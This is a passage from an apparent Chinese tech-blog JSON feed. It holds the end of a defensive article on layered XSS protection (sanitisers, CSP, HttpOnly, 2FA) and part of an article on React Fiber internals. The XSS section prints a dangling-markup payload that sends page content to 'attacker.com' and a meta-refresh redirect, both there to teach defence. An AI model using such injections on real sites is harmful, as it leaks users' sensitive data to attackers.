之類的套件去過濾，把不合法的標籤或是屬性過濾掉。</p>\n<p>雖然說使用這些 library 相對安全，但需要注意的是版本要時常更新，因為這類型的套件也可能會有漏洞的產生（<a href=\"https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/\">Mutation XSS via namespace confusion – DOMPurify &lt; 2.0.17 bypass</a>）。另外也需要注意使用時的設定，設定錯誤的話也有可能造成問題，實際案例可以參考：<a href=\"https://medium.com/cymetrics/prevent-xss-might-be-harder-than-you-thought-ce8c422540b\">防止 XSS 可能比想像中困難</a>。</p>\n<p>總結一下，想要做好第一關的 XSS 防禦，需要注意的事情有：</p>\n<ol>\n<li>意識到哪邊是使用者可以自己輸入資料的地方</li>\n<li>針對不同情境去做 XSS 的防禦</li>\n</ol>\n<p>也可以考慮導入現成的 <a href=\"https://www.cloudflare.com/zh-tw/learning/ddos/glossary/web-application-firewall-waf/\">WAF</a>（Web Application Firewall），直接幫你把一些看起來很可疑的 payload 擋住。不過 WAF 也不是百分百有效，只是多一道防線而已。<br>\n或是也可以關心一下這個比較新的東西：<a href=\"https://web.dev/trusted-types/\">Trusted Types</a>。</p>\n<h2 id=\"%E7%AC%AC%E4%BA%8C%E9%97%9C%EF%BC%9A%E9%98%BB%E6%AD%A2%E6%83%A1%E6%84%8F%E7%A8%8B%E5%BC%8F%E7%A2%BC%E8%A2%AB%E5%9F%B7%E8%A1%8C\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%BA%8C%E9%97%9C%EF%BC%9A%E9%98%BB%E6%AD%A2%E6%83%A1%E6%84%8F%E7%A8%8B%E5%BC%8F%E7%A2%BC%E8%A2%AB%E5%9F%B7%E8%A1%8C\">#</a> 第二關：阻止惡意程式碼被執行</h2>\n<p>假設第一關被突破了，攻擊者可以在網站上插入任意程式碼，這時候要考慮的事情就是如何阻止程式碼被執行。</p>\n<p>這一關的重點是 CSP，Content Security Policy。</p>\n<p>CSP 是一系列的規則，用來跟瀏覽器講說哪些來源的資源可以被載入，哪些不行，可以利用 response header 或是 <code>&lt;meta&gt;</code> tag 來指定頁面的 CSP 規則。</p>\n<p>舉例來說，如果我很確定網站上的 JS 都來自於同一個 origin，那我的 CSP 就可以這樣寫：</p>\n<pre class=\"language-js\"><code class=\"language-js\">Content<span class=\"token operator\">-</span>Security<span class=\"token operator\">-</span>Policy<span class=\"token operator\">:</span> <span class=\"token keyword\">default</span><span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span><span class=\"token punctuation\">;</span> script<span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span></code></pre>\n<p><code>self</code> 代表的是 same origin 的意思。這樣寫的話，如果你試著載入不是當前 origin 的 JS，或者是直接在頁面上用 inline 的方式執行 script，都會看到瀏覽器報錯：</p>\n<p><img src=\"https://user-images.githubusercontent.com/2755720/122629705-8f038380-d0f1-11eb-851d-04ed70c19317.png\" alt=\"xss2\"></p>\n<p>CSP 可以制定許多不同資源的規則，需要更詳細的解釋可以看這邊：<a href=\"https://content-security-policy.com/\">Content Security Policy Reference</a>。想找到比較完整的 CSP，去看一些大公司的實作是最快的，接著我們直接來看一下 GitHub 的 CSP 長什麼樣子（為了方便閱讀，有重新排版過）：</p>\n<pre class=\"language-csp\"><code class=\"language-csp\"><span class=\"token directive keyword\">default-src</span> <span class=\"token safe selector\">'none'</span><br><br><span class=\"token directive keyword\">base-uri</span> <span class=\"token safe selector\">'self'</span>;<br><br><span class=\"token directive keyword\">block-all-mixed-content</span>;<br><br><span class=\"token directive keyword\">connect-src</span> <span class=\"token safe selector\">'self'</span> uploads.github.com www.githubstatus.com collector.githubapp.com<br>api.github.com github-cloud.s3.amazonaws.com github-production-repository-file-5c1aeb.s3.amazonaws.com<br>github-production-upload-manifest-file-7fdce7.s3.amazonaws.com github-production-user-asset-6210df.s3.amazonaws.com<br>html-translator.herokuapp.com cdn.optimizely.com logx.optimizely.com/v1/events wss://alive.github.com<br><span class=\"token unsafe function\">*</span>.actions.githubusercontent.com wss://<span class=\"token unsafe function\">*</span>.actions.githubusercontent.com online.visualstudio.com/api/v1/locations<br>insights.github.com;<br><br><span class=\"token directive keyword\">font-src</span> github.githubassets.com;<br><br><span class=\"token directive keyword\">form-action</span> <span class=\"token safe selector\">'self'</span> github.com gist.github.com;<br><br><span class=\"token directive keyword\">frame-ancestors</span> <span class=\"token safe selector\">'none'</span>;<br><br><span class=\"token directive keyword\">frame-src</span> render.githubusercontent.com;<br><br><span class=\"token directive keyword\">img-src</span> <span class=\"token safe selector\">'self'</span> data: github.githubassets.com identicons.github.com collector.githubapp.com github-cloud.s3.amazonaws.com<br>secured-user-images.githubusercontent.com/ <span class=\"token unsafe function\">*</span>.githubusercontent.com;<br><br><span class=\"token directive keyword\">manifest-src</span> <span class=\"token safe selector\">'self'</span>;<br><br><span class=\"token directive keyword\">media-src</span> github.com user-images.githubusercontent.com/;<br><br><span class=\"token directive keyword\">script-src</span> github.githubassets.com;<br><br><span class=\"token directive keyword\">style-src</span> <span class=\"token unsafe function\">'unsafe-inline'</span> github.githubassets.com;<br><br><span class=\"token directive keyword\">worker-src</span> github.com/socket-worker-3f088aa2.js gist.github.com/socket-worker-3f088aa2.js</code></pre>\n<p>想要檢查 CSP 規則有沒有明顯漏洞的話，可以到 <a href=\"https://csp-evaluator.withgoogle.com/\">CSP Evaluator</a>，而 GitHub 的 CSP 設置得很嚴謹，幾乎每一種資源都有設定。</p>\n<p>這邊可以看到 script-src 的值只有 <code>github.githubassets.com</code>。因為沒有 <code>unsafe-inline</code> 的關係，所以 inline script 無法執行，而引入 script 的話也只能從 <code>github.githubassets.com</code> 這個來源引入，幾乎封死了執行 script 的路。</p>\n<p>而許多網站的 CSP 其實並不會設置得這麼嚴格，就有比較高的機率會被繞過，例如說 <a href=\"https://blog.orange.tw/2019/03/a-wormable-xss-on-hackmd.html\">A Wormable XSS on HackMD!</a> 直接用 cloudflare CDN 上的 AngularJS + CSTI 繞過；<a href=\"https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md\">HackMD Stored XSS &amp; Bypass CSP with Google Tag Manager</a> 則是用 Google Tag Manager 來繞。</p>\n<p>另外，在某些情境之下就算乍看被封死，依然可以透過現有的 script 來幫你繞過，詳細資訊可以參考這個很經典的演講：<a href=\"https://github.com/google/security-research-pocs/tree/master/script-gadgets\">Breaking XSS mitigations via Script gadgets</a>。</p>\n<p>那如果真的沒辦法執行 script，還有什麼可以做的呢？</p>\n<p>就算只是插入 HTML，也還是可以做事的。</p>\n<p>例如說可以利用插入 HTML meta tag 來造成重新導向，把使用者導到惡意網站去，像這樣：<code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;https://example.com&quot;&gt;</code>。</p>\n<p>或者是插入 <code>&lt;img src=&quot;https://attacker.com?q=</code>（注意這邊 src 的雙引號只有開頭），讓整段 HTML 變成：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://attacker.com?q=<br>&lt;div>user info&lt;/div><br>&lt;div>sensitive data&lt;/div><br>&lt;div class=<span class=\"token punctuation\">\"</span></span><span class=\"token attr-name\">test\"</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>藉由 src 沒有閉合的 <code>&quot;</code>，就可以拿到下一個 <code>&quot;</code> 為止的 HTML 內容，把這些當作 query string 的一部分傳到 server，而這中間可能就會有一些敏感資料的存在。所以 <code>img-src</code> 的 CSP 規則也是有用處的，可以防止這類型的攻擊。</p>\n<p>或也可以結合 <a href=\"https://blog.huli.tw/2021/01/23/dom-clobbering/\">DOM Clobbering</a>，看看有沒有什麼地方可以攻擊。</p>\n<p>因此，就算不能執行 script，依然有其他攻擊手法可以用。</p>\n<p>GitHub 在 2017 年時有寫過一篇 <a href=\"https://github.blog/2017-01-19-githubs-post-csp-journey/\">GitHub’s post-CSP journey</a>，特別講了他們的 CSP 是怎麼設計的，是為了防範哪些已知的攻擊，寫得非常不錯。他們甚至還有一個 bug bounty 是 <a href=\"https://bounty.github.com/targets/csp.html\">GitHub CSP</a>，就算沒有找到 XSS 也沒有關係，只要提出能繞過 CSP 的手法就可以拿到獎金。</p>\n<h2 id=\"%E7%AC%AC%E4%B8%89%E9%97%9C%EF%BC%9A%E9%99%8D%E4%BD%8E-xss-%E6%94%BB%E6%93%8A%E4%B9%8B%E6%90%8D%E5%AE%B3\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%89%E9%97%9C%EF%BC%9A%E9%99%8D%E4%BD%8E-xss-%E6%94%BB%E6%93%8A%E4%B9%8B%E6%90%8D%E5%AE%B3\">#</a> 第三關：降低 XSS 攻擊之損害</h2>\n<p>如果街亭跟前兩關都沒守住，XSS 勢在必行的話，接下來要思考的就是該如何降低 XSS 攻擊之損害。</p>\n<p>這邊我覺得有兩個面向可以去思考：</p>\n<ol>\n<li>避免攻擊者用受害者的身份登入</li>\n<li>避免攻擊者透過 XSS 進行比較重要的操作</li>\n</ol>\n<p>先來談第一種，有一種最常見的攻擊方式就是偷 cookie，把 document.cookie 偷走之後，若是使用者驗證身份的 token 在裡面，就可以直接用受害者的身份登入。因此這種驗證用的 cookie，請記得設定 <code>HttpOnly</code>，就能確保前端無法直接用 document.cookie 就取得 cookie。</p>\n<p>如果因為各種原因沒辦法保護使用者的 token，那就可以再設下其他關卡，例如說最常見的就是地點的檢查。假設一個使用者一直以來都在台灣，可是卻突然在烏克蘭發了一個 request，這時就可以先把這個操作擋住，並寄信告知使用者有可疑操作，麻煩他確認是否為本人。或也可以檢查使用者的瀏覽器是否一致，不一致的話一樣要先經過確認，加上另一道手續來保障使用者的安全。</p>\n<p>再來談第二種，就算 cookie 沒被偷走，因為攻擊者已經能執行任意程式碼了，所以直接打後端 API 還是做得到的，而且 cookie 會自動帶上。因此只要是使用者可以做的操作，攻擊者基本上都做得到。</p>\n<p>以部落格平台來說的話，發文、編輯文章或是刪文都是做得到的，攻擊者就只要直接利用 XSS 去打 API 就行了。</p>\n<p>這時候對於一些比較重要的操作，就應該設置第二道關卡，例如說更改密碼需要輸入原密碼，那這樣因為攻擊者不知道原密碼是什麼，打 API 也沒有用。或者是要轉帳的時候需要用手機接收驗證碼，沒有手機的話就無法執行操作。</p>\n<p><img src=\"https://user-images.githubusercontent.com/2755720/122629715-96c32800-d0f1-11eb-971b-10f405ebd010.png\" alt=\"xss3\"></p>\n<p>其實說白話一點就是 2FA（Two-factor authentication）啦。對於這些重要操作，除了登入之外還要設下第二種可以確認是本人的機制，這樣就算被打出 XSS，攻擊者也無法執行這些操作，可以讓損害降低。</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>資安的世界既廣又深，這篇提到的都只是大方向的概觀而已。若是再深入下去，每個環節都可以再變成多個獨立的主題，而且也可以結合其他的攻擊，例如說：</p>\n<ol>\n<li>自訂的 XSS 過濾規則有沒有可能有漏洞，會被繞過？有的話又該怎麼繞？</li>\n<li>儘管都過濾了，會不會其實 server side 的漏洞可以幫忙繞過？例如說 double encoding</li>\n<li>CSP 設得夠嚴謹嗎？有沒有現成的繞過方式？</li>\n<li>2FA 機制有實作完整嗎？rate limit 有設好嗎？沒有設的話是不是暴力破解就被爆破了？</li>\n<li>忘記密碼的機制有實作正確嗎？會不會可以用別人的身份幫忙重設密碼？</li>\n</ol>\n<p>XSS 並不是全有或是全無這麼簡單，有的網站雖然被 XSS，但影響範圍有限，而有的網站一被 XSS，連使用者的帳號密碼都可以輕易更改，直接把帳號給搶過來。</p>\n<p>在防禦 XSS 的時候，如果只防禦了第一關，只有想到「我要把 render 的內容 escape」就容易造成上面所講的狀況，要嘛就是整個網站都很安全連 XSS 都沒有，要嘛就是一被打出 XSS，整個網站就被打穿。</p>\n<p>所以在防禦的時候必須注意到上面提的這些不同的環節，針對每個環節都去做防禦，設下多個防線。就算攻擊者可以突破第一關，可能也會被第二關的 CSP 擋下，無法執行 JS；就算第二關被破了，還有第三關守著，降低 XSS 的影響程度，不會因為一個漏洞就讓使用者的帳戶整個被搶走。</p>\n",
      "date_published": "2021-06-17T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/mingyou/deep-dive-into-react-fiber/",
      "url": "https://tech-blog.cymetrics.io/posts/mingyou/deep-dive-into-react-fiber/",
      "title": "隱藏在 React 下的機制： Fiber",
      "content_html": "<p>不知不覺都 2021 年中了，從 React 16.3 的重大更新後也已經過了兩年多了，不知到大家還記不記得當時的兩大重要功能，其一為 Function Component ( hooks )，另一個大家比較不那麼熟悉但卻也很重要的則應該屬 Fiber 架構，但其實會有 hook 的設計也是也是因為上述架構的關係。</p>\n<p>在當時引想大家最多的應該屬生命週期的變換，不曉得大家是否還記得當時最常用到的生命週期 <code>componentWillUpdate</code>/<code>componentWillReceiveProps</code> 將被廢除時驚訝的心情? 而當時也加入了兩個新的 lifecycle 來解決以上問題。</p>\n<ul>\n<li>getDerivedStateFromProps</li>\n<li>getSnapshotBeforeUpdate</li>\n</ul>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p1.png\" alt=\"Re: React 常用的生命週期(1)\"><br>\n<a href=\"https://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/\">https://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/</a></p>\n<p>至於為什麼會產生以下的變化呢？這就要說說本次的主題 Fiber 了。</p>\n<h2 id=\"fiber-%E6%98%AF%E4%BB%80%E9%BA%BC\"><a class=\"direct-link\" href=\"#fiber-%E6%98%AF%E4%BB%80%E9%BA%BC\">#</a> Fiber 是什麼</h2>\n<p>Fiber 屬於更為底層的抽象行為，目的是為了達到以下幾種功能</p>\n<ul>\n<li>幫不同類型的工作分配優先順序</li>\n<li>暫停工作，稍後回來</li>\n<li>當不需要工作時取消</li>\n<li>重新使用已經完成的工作</li>\n</ul>\n<!-- summary -->\n<p>在尚未使用 Fiber 前，由於畫面更新前須由 reconciler ( React ) 調度完後才會送到 renderer，且當畫面複雜時，更動一個 state 狀態時也需要將底下的所有子元件重新 render 出一份 virtual dom，而在過去這個部分全部只由一個主線程去做同步式渲染，因此當有一個 Component 需要費時較多時間時，將會把主線程 block，當時間一長，就有可能導致來不及更新至指定時間範圍內，造成無法順利渲染，會有不順暢的情況發生。</p>\n<!-- summary -->\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p2.png\" alt=\"Re: sync mode 和 async mode 的差異\"><br>\n<a href=\"https://twitter.com/acdlite/status/977291318324948992\">https://twitter.com/acdlite/status/977291318324948992</a></p>\n<h2 id=\"fiber-%E7%9A%84%E7%94%A2%E7%94%9F%E5%8F%8A%E4%BD%9C%E7%94%A8\"><a class=\"direct-link\" href=\"#fiber-%E7%9A%84%E7%94%A2%E7%94%9F%E5%8F%8A%E4%BD%9C%E7%94%A8\">#</a> Fiber 的產生及作用</h2>\n<p>為了解決此問題，React 制定了 fiber 的結構，利用非同步的渲染方式來解決，將各元件拆解，也避免了長時間占用主線程所導致卡頓的問題。 ( 所使用的 <a href=\"https://developer.mozilla.org/zh-TW/docs/Web/API/Window/requestIdleCallback\">API</a>， <a href=\"https://github.com/facebook/react/blob/4c7036e807fa18a3e21a5182983c7c0f05c5936e/packages/react-reconciler/src/ReactFiberWorkLoop.new.js#L1541\">source code</a> )</p>\n<p>傳統 React 更新時會分成兩個時期</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p3.png\" alt=\"Re: React 更新時期\"></p>\n<ul>\n<li>reconciliation / render 階段 ( 判斷哪先元件需要更新，可中斷 )</li>\n<li>commit 階段 ( 插入、移動、刪除節點，不可中斷 )</li>\n</ul>\n<!--（有誤 需更正） commit phase 的執行很快，而 render phase 產生真實 DOM 的時間卻很久，因此在 react 更新元件時可能會中斷更新以避免阻塞瀏覽器，也代表可能會因為被中斷而重新執行，所以必須保持沒有 side effect 的情況來避免非預期的情況。 -->\n<p>reconciliation phase 會先通過 render 更新元件，在第一次實建立 Fiber 節點，並在之後更新與上一次所渲染的 DOM 比較，因此在 render 階段將執行以下生命週期方法判斷是否有更新：</p>\n<ul>\n<li>componentWillMount (已廢棄)</li>\n<li>componentWillReceiveProps (已廢棄)</li>\n<li>componentWillUpdate (已廢棄)</li>\n<li>getDerivedStateFromProps</li>\n<li>shouldComponentUpdate</li>\n</ul>\n<p>react 可以根據目前的狀況調整，可以選擇一次處理單個或者多個 fiber 並且調整優先權，因此可以異步執行及中斷，但也因為如此，內部的邏輯必須避免 side effect。</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p4.png\" alt=\"Re: Commit phrase 和 render phrase\"></p>\n<p>在 render 階段執行完後將會產生包含著 side effect 的 fiber 節點樹，而 side effect 事實上就是 commit 階段所需要更新操作，會在執行 commit 階段時輪詢 side effect 列表去對 DOM 進行修改。</p>\n<p>以下是commit階段執行的生命週期方法列表：</p>\n<ul>\n<li>getSnapshotBeforeUpdate</li>\n<li>componentDidMount</li>\n<li>componentDidUpdate</li>\n<li>componentWillUnmount</li>\n</ul>\n<p>因為這些方法在同步commit階段執行，所以它們可能包含副作用或更動 DOM。</p>\n<p>而前面說到被廢除的兩個 lifecycle 因為是屬於 render phase，有機會被多次執行，為了避免 side effect 發生，才會移除此 lifecycle。</p>\n<ul>\n<li><code>componentWillUpdate</code></li>\n<li><code>componentWillReceiveProps</code></li>\n</ul>\n<p>而拿掉以上 API 後則利用 <code>getDerivedStateFromProps</code> 來取代 <code>componentWillReceiveProps</code>，但由於 <code>getDerivedStateFromProps</code> 被設計成靜態函數，不用擔心 side effect 所帶來的影響，不過要避免從 props 等等去觸發 side effect。</p>\n<h2 id=\"fiber-nodes-%E5%92%8C-fiber-tree\"><a class=\"direct-link\" href=\"#fiber-nodes-%E5%92%8C-fiber-tree\">#</a> Fiber nodes 和 Fiber tree</h2>\n<p>在 reconciliation 時，每個 component 的 render 方法回傳的資料都會合併到 Fiber tree 中，每個React元素都有一個對應的 Fiber nodes，用來記錄對應的工作內容，而特別的地方在於在每次 render 時不會重新產生 Fiber node。</p>\n<p>更確切的說，每個 Fiber 就是一個 worker ，提供了跟踪，調度，暫停和中止工作的方法。</p>\n<p>每一個 Fiber Node 節點與 Virtual Dom 對應，所有 Fiber Node 連接起來形成 Fiber tree，為單向連結串列的樹狀結構：<br>\n<img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p5.png\" alt=\"Re: Fiber tree\"></p>\n<p>主要是為了將原本的樹狀遞迴輪詢轉變成循環輪詢，配合 requestIdleCallback API, 實現任務拆分、中斷與恢復。</p>\n<p>大概結構如下：</p>\n<pre class=\"language-js\"><code class=\"language-js\">type Fiber <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token comment\">// 標籤類型</span><br>  tag<span class=\"token operator\">:</span> TypeOfWork<span class=\"token punctuation\">,</span><br><br>  key<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">|</span> string<span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// 與 Fiber 所關聯的類型</span><br>  type<span class=\"token operator\">:</span> any<span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// local 狀態</span><br>  stateNode<span class=\"token operator\">:</span> any<span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// 以下區塊負責處理 Fiber</span><br><br>  <span class=\"token keyword\">return</span><span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// 單向連結串列結構</span><br>  child<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br>  sibling<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br>  index<span class=\"token operator\">:</span> number<span class=\"token punctuation\">,</span><br><br>  <span class=\"token operator\">...</span><br><br><br>  <span class=\"token comment\">// 輸出用的狀態</span><br>  memoizedState<span class=\"token operator\">:</span> any<span class=\"token punctuation\">,</span><br><br>  <span class=\"token operator\">...</span><br><br>  <span class=\"token comment\">// 紀錄在單向鏈結串列中的下一個 Fiber </span><br>  nextEffect<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// 子樹中具有 side effect 的第一個和最後一個光纖</span><br>  <span class=\"token comment\">// 當我們重用已完成的工作時，我們重用 link list 的一部分</span><br>  firstEffect<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br>  lastEffect<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// 快速確定子樹是否沒有正在等待的更動</span><br>  pendingWorkPriority<span class=\"token operator\">:</span> PriorityLevel<span class=\"token punctuation\">,</span><br><br><br>  <span class=\"token comment\">// 如果工作在光纖上進行，而該光纖已經在較低的優先權開始了一部分工作</span><br>  <span class=\"token comment\">// 那麼我們需要將已完成的工作儲存著。直到我們需要重新開始處理它為止</span><br>  <span class=\"token comment\">// 它可能與 \"目前\" 的 child 不同。</span><br>  progressedChild<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br><br>  <span class=\"token operator\">...</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>在這結構中，nextEffect / firstEffect / lastEffect 將在後面的章節 ( Effect List ) 中表現出相當的重要性。</p>\n<h2 id=\"workinprogress-tree\"><a class=\"direct-link\" href=\"#workinprogress-tree\">#</a> workInProgress tree</h2>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">createWorkInProgress</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">current<span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <br>    <span class=\"token keyword\">let</span> workInProgress <span class=\"token operator\">=</span> current<span class=\"token punctuation\">.</span>alternate<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>workInProgress <span class=\"token operator\">===</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        workInProgress <span class=\"token operator\">=</span> <span class=\"token function\">createFiber</span><span class=\"token punctuation\">(</span><span class=\"token operator\">...</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token operator\">...</span><br>    workInProgress<span class=\"token punctuation\">.</span>alternate <span class=\"token operator\">=</span> current<span class=\"token punctuation\">;</span><br>    current<span class=\"token punctuation\">.</span>alternate <span class=\"token operator\">=</span> workInProgress<span class=\"token punctuation\">;</span><br>    <span class=\"token operator\">...</span><br>    <span class=\"token keyword\">return</span> workInProgress<span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p><a href=\"https://github.com/facebook/react/blob/4c7036e807/packages/react-reconciler/src/ReactFiber.new.js#L254\">source code</a></p>\n<p>React 在第一次 render 時會將各節點紀錄為 Fiber Tree，而在之後檢查時會建立一個 workInProgress tree ，等待 workInProgress tree 完成後就會被當作 current tree，而此稱為<code>雙緩衝技術</code> (double buffering)。</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p6.png\" alt=\"\"><br>\n<a href=\"https://www.youtube.com/watch?v=ZCuYPiUIONs&amp;t=1040s\">source video</a></p>\n<h2 id=\"effect-list\"><a class=\"direct-link\" href=\"#effect-list\">#</a> Effect List</h2>\n<p>在上一張圖中，有標記標籤的元件是需要 side effect 進行處理的，為了達到高效的處理，因此需要將原本的樹狀咧表轉換為線性列表，才能夠快速的遍歷，除此之外還會省略沒有 side effect 的節點，流程如下圖：</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p7.png\" alt=\"\"></p>\n<p>順序的部分是從子到父的方式去執行，在各個階段如果為該層結構<strong>第一個節點</strong>會記錄在 firstEffect，其後則會記錄在 nextEffect 當中，並會在父層級將其合併起來並將自己綁入 lastEffect ，並向上傳遞，遇到沒有 effect 的節點會直接向上傳遞而不進行更動，最後將所有順序傳遞至 Root 層建立出如下圖的 effect list。</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p8.png\" alt=\"Re: Effect list\"><br>\n<a href=\"https://youtu.be/ZCuYPiUIONs?t=1373\">source video</a></p>\n<h2 id=\"render-%E9%9A%8E%E6%AE%B5%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%BE%AA%E7%92%B0\"><a class=\"direct-link\" href=\"#render-%E9%9A%8E%E6%AE%B5%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%BE%AA%E7%92%B0\">#</a> Render 階段的工作循環</h2>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">workLoop</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">isYieldy</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>isYieldy<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token comment\">// Flush work without yielding</span><br>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>nextUnitOfWork <span class=\"token operator\">!==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      nextUnitOfWork <span class=\"token operator\">=</span> <span class=\"token function\">performUnitOfWork</span><span class=\"token punctuation\">(</span>nextUnitOfWork<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token comment\">// Flush asynchronous work until the deadline runs out of time.</span><br>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>nextUnitOfWork <span class=\"token operator\">!==</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token function\">shouldYield</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      nextUnitOfWork <span class=\"token operator\">=</span> <span class=\"token function\">performUnitOfWork</span><span class=\"token punctuation\">(</span>nextUnitOfWork<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>在上面<a href=\"https://github.com/facebook/react/blob/f765f022534958bcf49120bf23bc1aa665e8f651/packages/react-reconciler/src/ReactFiberScheduler.js#L1136\">程式碼</a>中，nextUnitOfWork 存有 workInProgress 樹中的 Fiber nodes。當 React 輪詢 Fiber tree 時，它會使用這個變量來知曉是否有任何其他 Fiber nodes 具有未完成的工作。目前的 Fiber 處理完後，nextUnitOfWork 會指向下一個 Fiber node 或者 null (結束)。</p>\n<p>輪詢 Fiber trees 主要根據以下四個功能：</p>\n<ul>\n<li>performUnitOfWork</li>\n<li>beginWork</li>\n<li>completeUnitOfWork</li>\n<li>completeWork</li>\n</ul>\n<p>執行順序參考如下圖：</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p9.gif\" alt=\"\"><br>\n<a href=\"https://images.indepth.dev/images/2019/08/tmp2.gif\">source image</a></p>\n<p>由於透過了深度優先搜尋(DFS)，整個流程會優先執行底部 child node 的工作，最後才會到 parent node。</p>\n<h2 id=\"commit-%E9%9A%8E%E6%AE%B5\"><a class=\"direct-link\" href=\"#commit-%E9%9A%8E%E6%AE%B5\">#</a> Commit 階段</h2>\n<p>在這個階段，React 會將 render phase 所產生的 workInProgress tree 轉移到 current tree，並執行 render phase 所比對所產生的 Effect list，此步驟將會有更新 Dom 的節點等等的操作，假如有不需更新的項目將不會包含在 Effect list 中，所以不會被 commit (更新)。</p>\n<p>而執行完後的 current tree 將會被放到 finishedWork tree 中。</p>\n<p>而在此階段將會觸發以下操作：</p>\n<ul>\n<li>執行 getSnapshotBeforeUpdate event</li>\n<li>執行 componentWillUnmount event</li>\n<li>執行所有 DOM 操作</li>\n<li>將 finishedWork tree 設置為 current tree</li>\n<li>執行 componentDidMount event</li>\n<li>執行 componentDidUpdate event</li>\n</ul>\n<h3 id=\"dom-%E6%9B%B4%E6%96%B0\"><a class=\"direct-link\" href=\"#dom-%E6%9B%B4%E6%96%B0\">#</a> Dom 更新</h3>\n<p><a href=\"https://github.com/facebook/react/blob/95a313ec0b957f71798a69d8e83408f40e76765b/packages/react-reconciler/src/ReactFiberScheduler.js#L376\">commitAllHostEffects</a> 是React在其中執行DOM更新的函數。該函數定義了 Dom 需要執行的操作類型。</p>\n<h2 id=\"%E8%BC%83%E5%B0%91%E5%9C%A8%E7%94%A8-class-component-%EF%BC%8C%E9%82%A3%E4%BE%86%E8%AB%87%E8%AB%87-function-component\"><a class=\"direct-link\" 